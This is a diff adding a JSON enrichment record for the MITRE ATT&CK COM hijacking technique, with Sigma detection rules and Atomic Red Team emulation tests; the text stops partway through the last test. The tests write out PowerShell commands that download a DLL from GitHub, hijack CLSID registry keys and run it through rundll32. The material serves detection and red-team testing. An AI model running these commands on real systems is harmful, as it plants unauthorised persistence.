@@ -1,0 +1,253 @@
+{
+    "id": "T1546.015",
+    "name": "Component Object Model Hijacking",
+    "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry.\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.",
+    "platforms": "Windows",
+    "kill_chain_phases": "Privilege Escalation, Persistence",
+    "data_sources": "Process: Process Creation, Windows Registry: Windows Registry Key Modification, Command: Command Execution, Module: Module Load",
+    "detection": "There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USERSoftwareClassesCLSID may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINESOFTWAREClassesCLSID.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed.",
+    "url": "https://attack.mitre.org/techniques/T1546/015",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "8bc063d5-3a3a-4f01-a140-bc15e55e8437",
+                    "df4dc653-1029-47ba-8231-3c44238cc0ae",
+                    "f1edd233-30b5-4823-9e6a-c4171b24d316",
+                    "fe20dda1-6f37-4379-bbe0-a98d400cae90",
+                    "7ba08e95-1e0b-40cd-9db5-b980555e42fd",
+                    "3d968d17-ffa4-4bc0-bfdc-f139de76ce77",
+                    "bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
+                    "dc5c24af-6995-49b2-86eb-a9ff62199e82",
+                    "a0ff33d8-79e4-4cef-b4f3-9dc4133ccd12",
+                    "9b0f8a61-91b2-464f-aceb-0527e0a45020"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "8bc063d5-3a3a-4f01-a140-bc15e55e8437",
+                        "lookup_data": {
+                            "description": "Detects suspicious Powershell code that execute COM Objects",
+                            "raw": "author: frack113\ndate: 2022/04/02\ndescription: Detects suspicious Powershell code that execute COM Objects\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains|all:\n    - ::GetTypeFromCLSID(\n    - .ShellExecute(\nfalsepositives:\n- Legitimate PowerShell scripts\nid: 8bc063d5-3a3a-4f01-a140-bc15e55e8437\nlevel: medium\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md#atomic-test-2---powershell-execute-com-object\nstatus: experimental\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.015\ntitle: Suspicious GetTypeFromCLSID ShellExecute\n",
+                            "sigma:id": "8bc063d5-3a3a-4f01-a140-bc15e55e8437",
+                            "title": "Suspicious GetTypeFromCLSID ShellExecute",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "df4dc653-1029-47ba-8231-3c44238cc0ae",
+                        "lookup_data": {
+                            "description": "Detects potential persistence using Appx DebugPath",
+                            "raw": "author: frack113\ndate: 2022/07/27\ndescription: Detects potential persistence using Appx DebugPath\ndetection:\n  condition: 1 of selection_*\n  selection_debug:\n    EventType: SetValue\n    TargetObject|contains: Classes\\ActivatableClasses\\Package\\Microsoft.\n    TargetObject|endswith: \\DebugPath\n  selection_default:\n    EventType: SetValue\n    TargetObject|contains: \\Software\\Microsoft\\Windows\\CurrentVersion\\PackagedAppXDebug\\Microsoft.\n    TargetObject|endswith: \\(Default)\nfalsepositives:\n- Unknown\nid: df4dc653-1029-47ba-8231-3c44238cc0ae\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/\n- https://github.com/rootm0s/WinPwnage\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1546.015\ntitle: Potential Persistence Using DebugPath\n",
+                            "sigma:id": "df4dc653-1029-47ba-8231-3c44238cc0ae",
+                            "title": "Potential Persistence Using DebugPath",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f1edd233-30b5-4823-9e6a-c4171b24d316",
+                        "lookup_data": {
+                            "description": "load malicious registered COM objects",
+                            "raw": "author: frack113\ndate: 2022/02/13\ndescription: load malicious registered COM objects\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - '-sta '\n    - '-localserver '\n    CommandLine|contains|all:\n    - '{'\n    - '}'\n    Image|endswith: \\rundll32.exe\nfalsepositives:\n- Legitimate use\nid: f1edd233-30b5-4823-9e6a-c4171b24d316\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nreferences:\n- https://nasbench.medium.com/a-deep-dive-into-rundll32-exe-642344b41e90\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1546.015/T1546.015.md\nstatus: test\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1546.015\ntitle: Rundll32 Registered COM Objects\n",
+                            "sigma:id": "f1edd233-30b5-4823-9e6a-c4171b24d316",
+                            "title": "Rundll32 Registered COM Objects",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fe20dda1-6f37-4379-bbe0-a98d400cae90",
+                        "lookup_data": {
+                            "description": "Detect use of scrobj.dll as this DLL looks for the ScriptletURL key to get the location of the script to execute",
+                            "raw": "author: frack113\ndate: 2022/08/20\ndescription: Detect use of scrobj.dll as this DLL looks for the ScriptletURL key to\n  get the location of the script to execute\ndetection:\n  condition: selection\n  selection:\n    Details: C:\\WINDOWS\\system32\\scrobj.dll\n    EventType: SetValue\n    TargetObject|endswith: InprocServer32\\(Default)\nfalsepositives:\n- Legitimate use of the dll.\nid: fe20dda1-6f37-4379-bbe0-a98d400cae90\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1546.015/T1546.015.md\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1546.015\ntitle: Potential Persistence Via Scrobj.dll COM Hijacking\n",
+                            "sigma:id": "fe20dda1-6f37-4379-bbe0-a98d400cae90",
+                            "title": "Potential Persistence Via Scrobj.dll COM Hijacking",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7ba08e95-1e0b-40cd-9db5-b980555e42fd",
+                        "lookup_data": {
+                            "description": "Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM",
+                            "raw": "author: MSTIC, FPT.EagleEye\ndate: 2021/06/15\ndescription: Suspicious behaviours related to an actor tracked by Microsoft as SOURGUM\ndetection:\n  condition: selection or all of registry_*\n  registry_image:\n    CommandLine|contains: reg add\n    Image|contains:\n    - windows\\system32\\filepath2\n    - windows\\system32\\ime\n  registry_key:\n    CommandLine|contains:\n    - HKEY_LOCAL_MACHINE\\software\\classes\\clsid\\{7c857801-7381-11cf-884d-00aa004b2e24}\\inprocserver32\n    - HKEY_LOCAL_MACHINE\\software\\classes\\clsid\\{cf4cc405-e2c5-4ddd-b3ce-5e7582d8c9fa}\\inprocserver32\n  selection:\n    Image|contains:\n    - windows\\system32\\Physmem.sys\n    - Windows\\system32\\ime\\SHARED\\WimBootConfigurations.ini\n    - Windows\\system32\\ime\\IMEJP\\WimBootConfigurations.ini\n    - Windows\\system32\\ime\\IMETC\\WimBootConfigurations.ini\nfalsepositives:\n- Unknown\nid: 7ba08e95-1e0b-40cd-9db5-b980555e42fd\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://www.virustotal.com/gui/file/c299063e3eae8ddc15839767e83b9808fd43418dc5a1af7e4f44b97ba53fbd3d/detection\n- https://github.com/Azure/Azure-Sentinel/blob/43e9be273dca321295190bfc4902858e009d4a35/Detections/MultipleDataSources/SOURGUM_IOC.yaml\n- https://www.microsoft.com/security/blog/2021/07/15/protecting-customers-from-a-private-sector-offensive-actor-using-0-day-exploits-and-devilstongue-malware/\nstatus: test\ntags:\n- attack.t1546\n- attack.t1546.015\n- attack.persistence\n- attack.privilege_escalation\ntitle: SOURGUM Actor Behaviours\n",
+                            "sigma:id": "7ba08e95-1e0b-40cd-9db5-b980555e42fd",
+                            "title": "SOURGUM Actor Behaviours",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "3d968d17-ffa4-4bc0-bfdc-f139de76ce77",
+                        "lookup_data": {
+                            "description": "Detects potential COM object hijacking where the \"Server\" (In/Out) is pointing to a supsicious or unsuale location",
+                            "raw": "author: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022/07/28\ndescription: Detects potential COM object hijacking where the \"Server\" (In/Out) is\n  pointing to a supsicious or unsuale location\ndetection:\n  condition: selection\n  selection:\n    Details|contains:\n    - \\Users\\Public\\\n    - \\Desktop\\\n    - \\AppData\\Local\\Temp\\\n    - \\Downloads\\\n    - \\Windows\\Temp\\\n    - \\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\n    - \\System32\\spool\\drivers\\color\\\n    - '%temp%'\n    - '%tmp%'\n    - '%appdata%'\n    EventType: SetValue\n    TargetObject|endswith:\n    - \\InprocServer32\\(Default)\n    - \\LocalServer32\\(Default)\n    TargetObject|startswith:\n    - HKCR\\CLSID\\\n    - HKEY_CLASSES_ROOT\\CLSID\\\n    - HKCU\\Software\\Classes\\CLSID\\\n    - HKEY_CURRENT_USER\\Software\\Classes\\CLSID\\\nfalsepositives:\n- Probable legitimate applications. If you find these please add them to an exclusion\n  list\nid: 3d968d17-ffa4-4bc0-bfdc-f139de76ce77\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/\n  (idea)\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1546.015\ntitle: Potential Persistence Via COM Hijacking From Suspicious Locations\n",
+                            "sigma:id": "3d968d17-ffa4-4bc0-bfdc-f139de76ce77",
+                            "title": "Potential Persistence Via COM Hijacking From Suspicious Locations",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "bc0f5e80-91c0-4e04-9fbb-e4e332c85dae",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1546.015",
+                            "mitre-cti:description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \n\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",
+                            "mitre-cti:name": "Component Object Model Hijacking",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Elastic'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae', 'type': 'attack-pattern', 'created': '2020-03-16T14:12:47.923Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1546.015', 'url': 'https://attack.mitre.org/techniques/T1546/015'}, {'url': 'https://msdn.microsoft.com/library/ms694363.aspx', 'description': 'Microsoft. (n.d.). The Component Object Model. Retrieved August 18, 2016.', 'source_name': 'Microsoft Component Object Model'}, {'url': 'https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence', 'description': 'G DATA. (2014, October). COM Object hijacking: the discreet way of persistence. Retrieved August 13, 2016.', 'source_name': 'GDATA COM Hijacking'}, {'source_name': 'Elastic COM Hijacking', 'description': 'Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting Persistence & Evasion with the COM. Retrieved September 15, 2016.', 'url': 'https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com'}], 'modified': '2020-11-10T18:19:44.750Z', 'name': 'Component Object Model Hijacking', 'description': \"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. \\n\\nAdversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. \", 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'privilege-escalation'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'persistence'}], 'x_mitre_detection': 'There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\CLSID\\\\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\CLSID\\\\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  \\n\\nLikewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. ', 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'Process: Process Creation', 'Windows Registry: Windows Registry Key Modification', 'Module: Module Load'], 'x_mitre_permissions_required': ['User']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "dc5c24af-6995-49b2-86eb-a9ff62199e82",
+                        "lookup_data": {
+                            "description": "Detect modification of TreatAs key to enable \"rundll32.exe -sta\" command",
+                            "raw": "author: frack113\ndate: 2022/08/28\ndescription: Detect modification of TreatAs key to enable \"rundll32.exe -sta\" command\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_misexec:\n    Image:\n    - C:\\Windows\\system32\\msiexec.exe\n    - C:\\Windows\\SysWOW64\\msiexec.exe\n  filter_office:\n    Image|endswith: \\OfficeClickToRun.exe\n    Image|startswith: C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\\n  filter_office2:\n    Image: C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe\n  filter_svchost:\n    Image: C:\\Windows\\system32\\svchost.exe\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: TreatAs\\(Default)\nfalsepositives:\n- Legitimate use\nid: dc5c24af-6995-49b2-86eb-a9ff62199e82\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/06\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1546.015/T1546.015.md\n- https://www.youtube.com/watch?v=3gz1QmiMhss&t=1251s\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1546.015\ntitle: COM Hijacking via TreatAs\n",
+                            "sigma:id": "dc5c24af-6995-49b2-86eb-a9ff62199e82",
+                            "title": "COM Hijacking via TreatAs",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "a0ff33d8-79e4-4cef-b4f3-9dc4133ccd12",
+                        "lookup_data": {
+                            "description": "Detects potential COM object hijacking leveraging the COM Search Order",
+                            "raw": "author: \"Maxime Thiebaut (@0xThiebaut), oscd.community, C\\xE9dric Hien\"\ndate: 2020/04/14\ndescription: Detects potential COM object hijacking leveraging the COM Search Order\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_bonjourlib:\n    Details:\n    - C:\\Windows\\system32\\dnssdX.dll\n    - C:\\Windows\\SysWOW64\\dnssdX.dll\n  filter_defender:\n    Image|endswith: \\MsMpEng.exe\n    Image|startswith:\n    - C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\\n    - C:\\Program Files\\Windows Defender\\\n  filter_dropbox:\n    Details|contains|all:\n    - \\AppData\\Roaming\\Dropbox\\\n    - \\DropboxExt64.*.dll\n  filter_dx:\n    Image: C:\\WINDOWS\\SYSTEM32\\dxdiag.exe\n  filter_edge:\n    Image|endswith: \\MicrosoftEdgeUpdateComRegisterShell64.exe\n  filter_gameservice:\n    Details|contains: C:\\WINDOWS\\system32\\GamingServicesProxy.dll\n  filter_generic:\n    Details|contains:\n    - '%%systemroot%%\\system32\\'\n    - '%%systemroot%%\\SysWow64\\'\n  filter_health_service:\n    Image: C:\\WINDOWS\\system32\\SecurityHealthService.exe\n  filter_inprocserver:\n    Image:\n    - C:\\Windows\\System32\\poqexec.exe\n    - C:\\Windows\\System32\\regsvr32.exe\n    TargetObject|endswith: \\InProcServer32\\(Default)\n  filter_nvidia:\n    Details|contains: \\FileRepository\\nvmdi.inf\n  filter_onedrive:\n    Details|contains:\n    - \\AppData\\Local\\Microsoft\\OneDrive\\\n    - \\FileCoAuthLib64.dll\n    - \\FileSyncShell64.dll\n    - \\FileSyncApi64.dll\n  filter_poqexec:\n    Details|contains: C:\\Windows\\System32\\Autopilot.dll\n    Image: C:\\Windows\\System32\\poqexec.exe\n  filter_printextensionmanager:\n    Details: C:\\Windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll\n  filter_programdata:\n    Details|startswith: C:\\ProgramData\\Microsoft\\\n  filter_programfiles:\n    Details|startswith:\n    - C:\\Program Files\\\n    - C:\\Program Files (x86)\\\n  filter_python:\n    Details:\n    - C:\\Windows\\pyshellext.amd64.dll\n    - C:\\Windows\\pyshellext.dll\n  filter_sec_health_svc:\n    Details|contains: C:\\Windows\\System32\\SecurityHealth\n    Image: C:\\Windows\\system32\\SecurityHealthService.exe\n  filter_teams:\n    Details|contains|all:\n    - \\AppData\\Local\\Microsoft\\TeamsMeetingAddin\\\n    - \\Microsoft.Teams.AddinLoader.dll\n  filter_trend_micro:\n    Details|endswith: TmopIEPlg.dll\n  filter_update:\n    Image:\n    - C:\\WINDOWS\\system32\\wuauclt.exe\n    - C:\\WINDOWS\\system32\\svchost.exe\n  selection:\n    EventType: SetValue\n    TargetObject|endswith: \\InprocServer32\\(Default)\n    TargetObject|startswith:\n    - HKCR\\CLSID\\\n    - HKCU\\Software\\Classes\\CLSID\\\nfalsepositives:\n- Some installed utilities (i.e. OneDrive) may serve new COM objects at user-level\nid: a0ff33d8-79e4-4cef-b4f3-9dc4133ccd12\nlevel: medium\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2023/01/10\nreferences:\n- https://www.cyberbit.com/blog/endpoint-security/com-hijacking-windows-overlooked-security-vulnerability/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1546.015\ntitle: Potential Persistence Via COM Search Order Hijacking\n",
+                            "sigma:id": "a0ff33d8-79e4-4cef-b4f3-9dc4133ccd12",
+                            "title": "Potential Persistence Via COM Search Order Hijacking",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "9b0f8a61-91b2-464f-aceb-0527e0a45020",
+                        "lookup_data": {
+                            "description": "Detects COM object hijacking via TreatAs subkey",
+                            "raw": "author: Kutepov Anton, oscd.community\ndate: 2019/10/23\ndescription: Detects COM object hijacking via TreatAs subkey\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_svchost:\n    Image: C:\\WINDOWS\\system32\\svchost.exe\n  selection:\n    EventType: CreateKey\n    TargetObject|contains|all:\n    - HKU\\\n    - Classes\\CLSID\\\n    - \\TreatAs\nfalsepositives:\n- Maybe some system utilities in rare cases use linking keys for backward compatibility\nid: 9b0f8a61-91b2-464f-aceb-0527e0a45020\nlevel: medium\nlogsource:\n  category: registry_add\n  product: windows\nmodified: 2022/09/29\nreferences:\n- https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/\nstatus: experimental\ntags:\n- attack.persistence\n- attack.t1546.015\ntitle: Windows Registry Persistence COM Key Linking\n",
+                            "sigma:id": "9b0f8a61-91b2-464f-aceb-0527e0a45020",
+                            "title": "Windows Registry Persistence COM Key Linking",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1546.015",
+                "display_name": "Event Triggered Execution: Component Object Model Hijacking",
+                "atomic_tests": [
+                    {
+                        "name": "COM Hijacking - InprocServer32",
+                        "auto_generated_guid": "48117158-d7be-441b-bc6a-d9e36e47b52b",
+                        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "clsid_threading": {
+                                "description": "Threading Model",
+                                "type": "string",
+                                "default": "Apartment"
+                            },
+                            "dllpath": {
+                                "description": "Path to the DLL.",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\AtomicTest.dll"
+                            },
+                            "clsid": {
+                                "description": "Class ID to hijack.",
+                                "type": "string",
+                                "default": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+                            },
+                            "clsid_description": {
+                                "description": "Description for CLSID",
+                                "type": "string",
+                                "default": "MSAA AccPropServices"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "DLL For testing",
+                                "prereq_command": "if (Test-Path \"#{dllpath}\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll\" -OutFile \"#{dllpath}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dllpath}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta #{clsid}'",
+                            "cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Powershell Execute COM Object",
+                        "auto_generated_guid": "752191b1-7c71-445c-9dbe-21bb031b18eb",
+                        "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
+                            "command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\"))\n$item = $o.Item()\n$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)\n",
+                            "cleanup_command": "Get-Process -Name \"*calc\" | Stop-Process\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "COM Hijacking with RunDLL32 (Local Server Switch)",
+                        "auto_generated_guid": "123520cc-e998-471b-a920-bd28e3feafa0",
+                        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "clsid_threading": {
+                                "description": "Threading Model",
+                                "type": "string",
+                                "default": "Both"
+                            },
+                            "dll_path": {
+                                "description": "Path to the DLL.",
+                                "type": "string",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1546.015_calc.dll"
+                            },
+                            "clsid": {
+                                "description": "Class ID to hijack.",
+                                "type": "string",
+                                "default": "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+                            },
+                            "clsid_description": {
+                                "description": "Description for CLSID",
+                                "type": "string",
+                                "default": "MSAA AccPropServices"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "DLL For testing",
+                                "prereq_command": "if (Test-Path \"#{dll_path}\") {exit 0} else {exit 1}",
+                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015_calc.dll\" -OutFile \"#{dll_path}\"\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'\nNew-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value \"#{dll_path}\"\nNew-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"\nStart-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'",
+                            "cleanup_command": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Recurse -ErrorAction Ignore",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "COM hijacking via TreatAs",
+                        "auto_generated_guid": "33eacead-f117-4863-8eb0-5c6304fbfaa9",
+                        "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "executor": {
